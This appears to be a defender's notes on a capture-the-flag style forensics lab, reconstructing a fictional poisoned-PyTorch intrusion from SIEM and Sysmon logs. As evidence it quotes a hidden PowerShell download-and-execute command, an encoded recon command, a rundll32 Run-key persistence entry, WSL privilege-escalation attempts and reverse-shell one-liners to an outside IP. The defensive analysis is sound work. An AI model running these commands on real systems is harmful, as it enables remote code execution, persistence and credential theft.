### Poisoned PyTorch Lab

Goal: `Investigate a software supply-chain compromise that escalates into a ransomware attack, with emphasis on identifying pre-encryption operations.`

Scenario: `On 2 February 2026 (UTC), a developer at unucorb executed a model training script from Visual Studio Code on PC01 as part of an internal AI/ML project. Unbeknownst to the user, a trusted third-party Python dependency within the project had been tampered with, resulting in silent code execution and the establishment of remote access on the workstation. Your objective is to analyze the provided SIEM telemetry and host-based artifacts to reconstruct the end-to-end intrusion timeline, determine how initial access was achieved, track attacker activity across the domain, and identify pre-encryption behavior and ransomware impact used to maximize damage.`

Just notes....

Initial Access
--------------

Initial access was achieved via a software supply-chain compromise involving the Python dependency PyTorch (torch). The torch package is a trusted third-party machine learning library that had been tampered with to include a malicious backdoor in this scenario. When the developer executed the model training script from Visual Studio Code on PC01, the Python interpreter imported the torch module as part of the application runtime. Because the installed version of the dependency had been compromised, malicious code embedded within the package executed automatically during the import process. The malicious code spawned a hidden PowerShell process which downloaded and executed a second-stage payload from the attacker-controlled host: **http://<54.93.78.216>/a**
This established remote access to the workstation, initiating the attacker’s foothold in the environment. This attack is effective because developers inherently trust widely used dependencies, and importing a module in Python executes package initialization code automatically. As a result, malicious code embedded in a dependency can run without any additional user interaction beyond executing the application.

Execution
---------

The origin of this instrusion came from a script the developer ran in his AI/ML project directory, `C:\Users\michelvic\torch-inference-stack\training\train.py`.
At 2026-02-02 01:17:01, torch lib already imported meaning the malicious PS command from above executed on PC01. Pivoting to outbound comms (Event ID 3 -- Sysmon Logs) from PC01 following the PS download, michelvic (worksation) contacted <54.93.78.216:80> to grab the first stage payload. This was at 2/2/2026 1:17:06 AM which coorelates with the powershell command execution seconds before. The IP was also visible above from the Sysmon Event ID 1 log too. 

Discovery
--------

So were dealing with a domain env that PC01 is aprt of. The attacker began performing recon to understand domain trust relatinships from PC01. The attacker most likely used a Windows native tool to perform that domnain trust enumeration. Here it is
```
nltestrk.exe
"C:\Windows\system32\nltest.exe" /domain_trusts
"C:\Windows\system32\nltest.exe" /domain_trusts /all_trusts
which most likely came from this -> powershell -nop -exec bypass -EncodedCommand bgBsAHQAZQBzAHQAIAAvAGQAbwBtAGEAaQBuAF8AdAByAHUAcwB0AHMA
```
What Im noticing is the attacker is supplying the target recon commands via PS as an encoded command which decodes right after to execute. 

Persistence
----------

The attacker dropped a secondary payload for persistence
```
powershell.exe -NoProfile -WindowStyle Hidden -Command "IEX ((new-object net.webclient).downloadstring('http://54.93.78.216:80/a'))"
....
RUNDLL32.EXE
rundll32.exe  C:\Users\michelvic\AppData\Roaming\updlate.dll, StartW
c:\Users\michelvic\torch-inference-stack\
timestamp: 2/2/2026 1:47:34 AM
```
this coorelates with the network logs
```
timestamp: 2/2/2026 1:47:36 AM
C:\Windows\System32\rundll32.exe
UNUCORB\michelvic
tcp
True
False
10.10.11.92
-
60120
-
False
54.93.78.216
-
80
-
```

This file creation activity/execution shows that the persistent payload was stored in a user-writeable directory. Lets grab the sha256 hash of the persistent DLL.
sha256: `

This DLL peformed registry modification to persist the DLL. The benign-looking value name it used to blend in with legit software is `Updater`
```
timestamp: 2/2/2026 1:48:39 AM
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
HKU\S-1-5-21-3415631042-2785832853-3881933999-1167\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater
rundll32.exe "C:\Users\michelvic\AppData\Roaming\updlate.dll",StartW
UNUCORB\michelvic
```

Privesc
-------

The attacker did escalate privs but before that, a privesc attempt was made to abuse an installed Windows feature that failed
```
C:\Windows\system32\cmd.exe /C where /R c:\windows bash.exe
C:\Windows\system32\cmd.exe /C where /R c:\windows wsl.exe
C:\Windows\system32\cmd.exe /C wsl whoami
C:\Windows\system32\cmd.exe /C wsl whoami
then logged internal linux processes
all done under the same user: UNUCORB\michelvic

then
C:\Windows\system32\cmd.exe /C wsl -u root <- attempt to escalate inside WSL
same logged internal linux processes
still under UNUCORB\michelvic

then ran C:\Windows\system32\cmd.exe /C wsl whoami
still under UNUCORB\michelvic
ran this C:\Windows\system32\cmd.exe /C wsl.exe cat ~/.bash_history <- looking for credentials/history
still under UNUCORB\michelvic

ran this C:\Windows\system32\cmd.exe /C wsl sudo whoami <- attempting sudo escalation
under the same UNUCORB\michelvic user

attempting a reverse shell from WSL
then ran C:\Windows\system32\cmd.exe /C wsl sudo sh -i >& /dev/udp/18.197.226.152/4242 0>&1 
and
C:\Windows\system32\cmd.exe /C wsl sh -i >& /dev/udp/18.197.226.152/4242 0>&1
and
C:\Windows\system32\cmd.exe /C wsl sh -i >& /dev/udp/18.197.226.152/4242
under the same UNUCORB\michelvic user
```

Discovery
---------

credential hunting file hunting: password, cred, config, xml, ini, txt, unattend, sysprep | well known creds leak: unattend.xml, sysgrep.inf, web.config, groups.xml, cred.xml
